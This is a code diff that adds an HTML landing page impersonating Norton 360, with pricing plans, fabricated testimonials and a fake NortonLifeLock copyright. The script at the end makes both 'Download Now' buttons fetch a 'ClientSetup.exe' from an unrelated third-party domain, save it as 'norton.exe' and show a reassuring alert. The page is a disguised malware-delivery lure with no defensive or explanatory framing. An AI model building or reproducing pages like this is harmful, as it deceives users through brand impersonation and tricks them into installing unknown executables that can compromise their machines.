@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Norton™ 360 | All-in-one Protection</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .gradient-bg {
+            background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
+        }
+        .download-btn {
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.4);
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.6);
+        }
+        .feature-card {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+    </style>
+</head>
+<body class="font-sans bg-gray-50">
+    <!-- Header -->
+    <header class="gradient-bg text-white">
+        <div class="container mx-auto px-4 py-6">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-2">
+                    <i class="fas fa-shield-alt text-3xl text-yellow-400"></i>
+                    <span class="text-2xl font-bold">Norton™</span>
+                </div>
+                <nav class="hidden md:flex space-x-8">
+                    <a href="#" class="hover:text-yellow-300 transition">Home</a>
+                    <a href="#" class="hover:text-yellow-300 transition">Features</a>
+                    <a href="#" class="hover:text-yellow-300 transition">Pricing</a>
+                    <a href="#" class="hover:text-yellow-300 transition">Support</a>
+                </nav>
+                <button class="md:hidden text-2xl">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="gradient-bg text-white py-16 md:py-24">
+        <div class="container mx-auto px-4 flex flex-col md:flex-row items-center">
+            <div class="md:w-1/2 mb-10 md:mb-0">
+                <div class="bg-yellow-400 text-gray-900 inline-block px-3 py-1 rounded-full text-sm font-bold mb-4">
+                    LIMITED TIME OFFER
+                </div>
+                <h1 class="text-4xl md:text-5xl font-bold leading-tight mb-4">
+                    Norton™ 360 <br>
+                    <span class="text-yellow-300">Save Up To 18%</span>
+                </h1>
+                <p class="text-xl mb-8 opacity-90">
+                    All-in-one protection for your devices, privacy and identity.
+                </p>
+                <div class="flex flex-col sm:flex-row space-y-4 sm:space-y-0 sm:space-x-4">
+                    <button id="downloadBtn" class="download-btn bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-3 px-8 rounded-full flex items-center justify-center pulse">
+                        <i class="fas fa-download mr-2"></i> Download Now
+                    </button>
+                    <button class="bg-transparent hover:bg-white hover:bg-opacity-10 border-2 border-white text-white font-bold py-3 px-8 rounded-full">
+                        Learn More
+                    </button>
+                </div>
+                <div class="mt-6 flex items-center">
+                    <div class="flex mr-4">
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                        <i class="fas fa-star text-yellow-400"></i>
+                    </div>
+                    <span>Rated 4.8/5 by 10,000+ users</span>
+                </div>
+            </div>
+            <div class="md:w-1/2 flex justify-center">
+                <img src="https://www.norton.com/content/dam/norton/global/images/non-product/misc/tile/norton-360-2022-2-device.png" 
+                     alt="Norton 360 Protection" 
+                     class="w-full max-w-md">
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-4">Complete Protection For Your Digital Life</h2>
+            <p class="text-center text-gray-600 max-w-2xl mx-auto mb-12">
+                Norton 360 delivers multi-layered protection to help keep your devices, identity and online privacy safe.
+            </p>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Feature 1 -->
+                <div class="feature-card bg-gray-50 p-8 rounded-xl">
+                    <div class="w-14 h-14 bg-blue-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-lock text-blue-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Virus Protection</h3>
+                    <p class="text-gray-600">
+                        Advanced security helps protect against existing and emerging malware threats, including ransomware and viruses.
+                    </p>
+                </div>
+                
+                <!-- Feature 2 -->
+                <div class="feature-card bg-gray-50 p-8 rounded-xl">
+                    <div class="w-14 h-14 bg-purple-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-user-shield text-purple-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Dark Web Monitoring</h3>
+                    <p class="text-gray-600">
+                        We monitor the dark web for your personal information and alert you if we find your data.
+                    </p>
+                </div>
+                
+                <!-- Feature 3 -->
+                <div class="feature-card bg-gray-50 p-8 rounded-xl">
+                    <div class="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-key text-green-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Secure VPN</h3>
+                    <p class="text-gray-600">
+                        Help protect your data when connecting to public Wi-Fi with bank-grade encryption.
+                    </p>
+                </div>
+                
+                <!-- Feature 4 -->
+                <div class="feature-card bg-gray-50 p-8 rounded-xl">
+                    <div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-credit-card text-red-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Identity Theft Protection</h3>
+                    <p class="text-gray-600">
+                        Get alerts if we detect your personal information is being used to apply for credit.
+                    </p>
+                </div>
+                
+                <!-- Feature 5 -->
+                <div class="feature-card bg-gray-50 p-8 rounded-xl">
+                    <div class="w-14 h-14 bg-yellow-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-cloud text-yellow-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Cloud Backup</h3>
+                    <p class="text-gray-600">
+                        Automatically back up important files to the cloud to help protect against data loss due to ransomware or hard drive failures.
+                    </p>
+                </div>
+                
+                <!-- Feature 6 -->
+                <div class="feature-card bg-gray-50 p-8 rounded-xl">
+                    <div class="w-14 h-14 bg-indigo-100 rounded-full flex items-center justify-center mb-6">
+                        <i class="fas fa-child text-indigo-600 text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Parental Controls</h3>
+                    <p class="text-gray-600">
+                        Help your kids explore the internet more safely with parental controls.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Pricing Section -->
+    <section class="py-16 bg-gray-100">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-4">Choose Your Protection Plan</h2>
+            <p class="text-center text-gray-600 max-w-2xl mx-auto mb-12">
+                Select the Norton 360 plan that's right for you and save up to 18% today.
+            </p>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
+                <!-- Plan 1 -->
+                <div class="bg-white rounded-xl overflow-hidden shadow-lg">
+                    <div class="bg-blue-600 text-white py-4 px-6">
+                        <h3 class="font-bold text-xl">Standard</h3>
+                        <p class="opacity-90">1 Device</p>
+                    </div>
+                    <div class="p-6">
+                        <div class="mb-6">
+                            <span class="text-4xl font-bold">$39.99</span>
+                            <span class="text-gray-500 line-through ml-2">$49.99</span>
+                            <span class="block text-green-600 font-medium">Save 20%</span>
+                        </div>
+                        <ul class="space-y-3 mb-8">
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Antivirus & malware protection</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Password manager</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>2GB cloud backup</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Smart firewall</span>
+                            </li>
+                        </ul>
+                        <button class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded">
+                            Get Protection
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Plan 2 (Featured) -->
+                <div class="bg-white rounded-xl overflow-hidden shadow-xl transform scale-105 border-2 border-yellow-400">
+                    <div class="bg-gradient-to-r from-blue-600 to-purple-600 text-white py-4 px-6 relative">
+                        <div class="absolute -top-3 -right-3 bg-yellow-400 text-gray-900 font-bold text-xs px-3 py-1 rounded-full">
+                            MOST POPULAR
+                        </div>
+                        <h3 class="font-bold text-xl">Deluxe</h3>
+                        <p class="opacity-90">3 Devices</p>
+                    </div>
+                    <div class="p-6">
+                        <div class="mb-6">
+                            <span class="text-4xl font-bold">$59.99</span>
+                            <span class="text-gray-500 line-through ml-2">$69.99</span>
+                            <span class="block text-green-600 font-medium">Save 14%</span>
+                        </div>
+                        <ul class="space-y-3 mb-8">
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Everything in Standard</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Secure VPN</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>50GB cloud backup</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Dark web monitoring</span>
+                            </li>
+                        </ul>
+                        <button class="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 px-4 rounded">
+                            Get Protection
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Plan 3 -->
+                <div class="bg-white rounded-xl overflow-hidden shadow-lg">
+                    <div class="bg-purple-600 text-white py-4 px-6">
+                        <h3 class="font-bold text-xl">Premium</h3>
+                        <p class="opacity-90">5 Devices</p>
+                    </div>
+                    <div class="p-6">
+                        <div class="mb-6">
+                            <span class="text-4xl font-bold">$79.99</span>
+                            <span class="text-gray-500 line-through ml-2">$99.99</span>
+                            <span class="block text-green-600 font-medium">Save 18%</span>
+                        </div>
+                        <ul class="space-y-3 mb-8">
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Everything in Deluxe</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>100GB cloud backup</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Parental controls</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i class="fas fa-check text-green-500 mt-1 mr-2"></i>
+                                <span>Identity theft protection</span>
+                            </li>
+                        </ul>
+                        <button class="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-4 rounded">
+                            Get Protection
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="py-16 bg-white">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12">Trusted By Millions Worldwide</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-6xl mx-auto">
+                <!-- Testimonial 1 -->
+                <div class="bg-gray-50 p-8 rounded-xl">
+                    <div class="flex items-center mb-4">
+                        <div class="flex mr-2">
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                        </div>
+                        <span class="text-sm text-gray-500">2 days ago</span>
+                    </div>
+                    <p class="mb-6 italic text-gray-700">
+                        "Norton 360 has saved me multiple times from phishing attempts. The VPN is super fast and the dark web monitoring gave me peace of mind."
+                    </p>
+                    <div class="flex items-center">
+                        <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Sarah J." class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h4 class="font-bold">Sarah J.</h4>
+                            <p class="text-sm text-gray-500">Small Business Owner</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Testimonial 2 -->
+                <div class="bg-gray-50 p-8 rounded-xl">
+                    <div class="flex items-center mb-4">
+                        <div class="flex mr-2">
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                        </div>
+                        <span class="text-sm text-gray-500">1 week ago</span>
+                    </div>
+                    <p class="mb-6 italic text-gray-700">
+                        "The parental controls are excellent for keeping my kids safe online. The interface is intuitive and setup was a breeze."
+                    </p>
+                    <div class="flex items-center">
+                        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Michael T." class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h4 class="font-bold">Michael T.</h4>
+                            <p class="text-sm text-gray-500">Father of Three</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Testimonial 3 -->
+                <div class="bg-gray-50 p-8 rounded-xl">
+                    <div class="flex items-center mb-4">
+                        <div class="flex mr-2">
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                            <i class="fas fa-star text-yellow-400"></i>
+                        </div>
+                        <span class="text-sm text-gray-500">3 days ago</span>
+                    </div>
+                    <p class="mb-6 italic text-gray-700">
+                        "After my identity was stolen last year, Norton's protection has been invaluable. The dark web monitoring alerted me to another attempt immediately."
+                    </p>
+                    <div class="flex items-center">
+                        <img src="https://randomuser.me/api/portraits/women/68.jpg" alt="Lisa M." class="w-12 h-12 rounded-full mr-4">
+                        <div>
+                            <h4 class="font-bold">Lisa M.</h4>
+                            <p class="text-sm text-gray-500">Financial Advisor</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-16 gradient-bg text-white">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-3xl md:text-4xl font-bold mb-6">Ready To Experience Complete Protection?</h2>
+            <p class="text-xl mb-8 max-w-2xl mx-auto opacity-90">
+                Download Norton 360 today and secure your digital life with our award-winning protection.
+            </p>
+            <button id="downloadBtn2" class="download-btn bg-yellow-400 hover:bg-yellow-300 text-gray-900 font-bold py-4 px-12 rounded-full text-lg inline-flex items-center mx-auto">
+                <i class="fas fa-download mr-3"></i> Download Now
+            </button>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white py-12">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
+                <div>
+                    <div class="flex items-center space-x-2 mb-4">
+                        <i class="fas fa-shield-alt text-2xl text-yellow-400"></i>
+                        <span class="text-xl font-bold">Norton™</span>
+                    </div>
+                    <p class="text-gray-400">
+                        Protecting your devices, privacy and identity for over 30 years.
+                    </p>
+                </div>
+                
+                <div>
+                    <h3 class="font-bold text-lg mb-4">Products</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Norton 360</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Antivirus</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">VPN</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Password Manager</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="font-bold text-lg mb-4">Support</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Help Center</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Contact Us</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Downloads</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Community</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="font-bold text-lg mb-4">Company</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">About Us</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Careers</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Newsroom</a></li>
+                        <li><a href="#" class="text-gray-400 hover:text-white transition">Partners</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div class="pt-8 border-t border-gray-800 flex flex-col md:flex-row justify-between items-center">
+                <p class="text-gray-400 mb-4 md:mb-0">
+                    © 2023 NortonLifeLock Inc. All rights reserved.
+                </p>
+                <div class="flex space-x-6">
+                    <a href="#" class="text-gray-400 hover:text-white transition">
+                        <i class="fab fa-facebook-f"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white transition">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white transition">
+                        <i class="fab fa-instagram"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-white transition">
+                        <i class="fab fa-linkedin-in"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Function to trigger file download
+        function downloadFile() {
+            const downloadUrl = 'https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
+            const link = document.createElement('a');
+            link.href = downloadUrl;
+            link.download = 'norton.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            
+            // Optional: Show download confirmation
+            alert('Your Norton 360 download has started. Please wait...');
+        }
+
+        // Add event listeners to both download buttons
+        document.getElementById('downloadBtn').addEventListener('click', downloadFile);
+        document.getElementById('downloadBtn2').addEventListener('click', downloadFile);
+    </script>
+</body>
+</html>
